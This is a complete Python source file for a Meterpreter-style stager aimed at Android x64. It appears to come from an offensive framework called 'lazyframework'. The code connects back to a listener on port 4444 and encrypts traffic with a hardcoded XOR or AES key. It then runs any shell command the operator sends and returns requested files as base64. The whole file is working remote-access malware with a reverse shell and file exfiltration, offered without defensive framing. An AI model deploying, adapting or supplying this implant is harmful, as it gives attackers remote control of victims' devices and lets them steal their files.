#!/usr/bin/env python3
# Standalone Meterpreter Stager
# Platform: android, Arch: x64

import os
import sys
import socket
import struct
import json
import base64
import time
import random
import subprocess
import hashlib
from pathlib import Path


def evasion_none():
    pass


class MeterpreterCrypto:
    def __init__(self, key="lazyframework123456", method="xor"):
        self.method = method
        self.key = key.encode() if isinstance(key, str) else key
    
    def encrypt(self, data):
        if self.method == "xor":
            return self._xor_encrypt(data)
        elif self.method == "aes":
            return self._aes_encrypt(data)
        else:
            return data
    
    def decrypt(self, data):
        if self.method == "xor":
            return self._xor_decrypt(data)
        elif self.method == "aes":
            return self._aes_decrypt(data)
        else:
            return data
    
    def _xor_encrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        key_len = len(self.key)
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.key[i % key_len])
        return bytes(encrypted)
    
    def _xor_decrypt(self, data):
        return self._xor_encrypt(data)
    
    def _aes_encrypt(self, data):
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            from cryptography.hazmat.backends import default_backend
            if isinstance(data, str):
                data = data.encode()
            iv = os.urandom(16)
            aes_key = hashlib.sha256(self.key).digest()[:32]
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted = encryptor.update(padded_data) + encryptor.finalize()
            return iv + encrypted
        except ImportError:
            return self._xor_encrypt(data)
    
    def _aes_decrypt(self, data):
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            from cryptography.hazmat.backends import default_backend
            if len(data) < 16:
                return self._xor_decrypt(data)
            iv = data[:16]
            ciphertext = data[16:]
            aes_key = hashlib.sha256(self.key).digest()[:32]
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
            unpadder = padding.PKCS7(128).unpadder()
            decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
            return decrypted
        except ImportError:
            return self._xor_decrypt(data)

class MeterpreterClient:
    def __init__(self):
        self.lhost = "127.0.0.1"
        self.lport = 4444
        self.crypto = MeterpreterCrypto()
        self.socket = None
        self.session_id = None
    
    def connect(self):
        retries = 5
        timeout = 30
        for attempt in range(retries):
            try:
                self.socket = socket.create_connection((self.lhost, self.lport), timeout=timeout)
                handshake = self._create_handshake()
                self._send_packet(handshake)
                response = self._receive_packet()
                if response and response.get('type') == 'session_init':
                    self.session_id = response.get('session_id')
                    return True
            except Exception:
                if attempt < retries - 1:
                    time.sleep(10)
                continue
        return False
    
    def _create_handshake(self):
        return {
            'type': 'handshake',
            'version': '1.0',
            'system_info': {
                'platform': 'android',
                'arch': 'x64',
                'user': 'unknown',
                'hostname': 'unknown',
                'pid': os.getpid()
            },
            'encryption': 'xor',
            'timestamp': time.time()
        }
    
    def _send_packet(self, data):
        try:
            serialized = json.dumps(data).encode()
            encrypted = self.crypto.encrypt(serialized)
            length = struct.pack('>I', len(encrypted))
            self.socket.send(length + encrypted)
            return True
        except Exception:
            return False
    
    def _receive_packet(self):
        try:
            length_data = self._recv_all(4)
            if not length_data or len(length_data) != 4:
                return None
            length = struct.unpack('>I', length_data)[0]
            encrypted = self._recv_all(length)
            if not encrypted:
                return None
            decrypted = self.crypto.decrypt(encrypted)
            return json.loads(decrypted.decode())
        except Exception:
            return None

    def _recv_all(self, n):
        data = b''
        while len(data) < n:
            chunk = self.socket.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data
    
    def run(self):
        while True:
            try:
                packet = self._receive_packet()
                if not packet:
                    break
                if packet.get('type') == 'command':
                    result = self._execute_command(packet.get('command', ''))
                    response = {
                        'type': 'command_result',
                        'session_id': self.session_id,
                        'result': result,
                        'timestamp': time.time()
                    }
                    self._send_packet(response)
                elif packet.get('type') == 'download':
                    file_data = self._read_file(packet.get('remote_path', ''))
                    response = {
                        'type': 'file_data',
                        'session_id': self.session_id,
                        'file_data': file_data,
                        'timestamp': time.time()
                    }
                    self._send_packet(response)
                time.sleep(0.1)
            except Exception:
                break
    
    def _execute_command(self, command):
        try:
            if command.startswith('cd '):
                os.chdir(command[3:])
                return f"Changed directory to: {os.getcwd()}"
            elif command in ['exit', 'quit']:
                return "EXIT"
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout + result.stderr
        except Exception as e:
            return str(e)
    
    def _read_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except Exception:
            return ""


def install_persistence():
    return False


def main():
    evasion_none()
    client = MeterpreterClient()
    if client.connect():
        client.run()

if __name__ == "__main__":
    main()
